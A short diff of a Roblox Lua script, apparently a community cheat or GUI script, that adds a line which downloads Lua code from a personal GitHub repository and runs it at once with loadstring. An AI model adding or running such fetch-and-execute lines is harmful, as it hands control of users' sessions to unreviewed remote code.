@@ -5,6 +5,8 @@ Skid Be like
 Lmao
 --]]
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/Booster%20Whitelist%20And%20Blacklist.lua"))()
+
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local textService = game:GetService("TextService")
